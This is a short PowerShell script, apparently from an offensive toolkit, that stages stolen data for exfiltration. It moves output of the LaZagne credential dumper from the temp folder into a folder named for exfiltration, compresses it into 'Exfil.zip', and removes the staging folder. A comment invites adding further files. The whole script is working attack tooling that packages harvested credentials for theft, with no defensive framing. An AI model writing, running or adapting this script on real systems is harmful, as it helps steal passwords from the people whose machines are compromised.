$temp = $env:TEMP
$archiveFolder = Join-Path $temp "ExfilPreCompress"
New-Item -ItemType Directory -Path $archiveFolder -Force | Out-Null
$files = @(
	Join-Path $temp "LaZagne.txt" #Add the rest of the files to this list to be added to archive and compressed
	)
$files | Move-Item -Destination $archiveFolder
$zipPath = Join-Path $temp "Exfil.zip"
Compress-Archive -Path $archiveFolder -DestinationPath $zipPath -Force
Remove-Item $archiveFolder -Recurse -Force
Write-Output "Exfil Data Compressed to $zipPath"
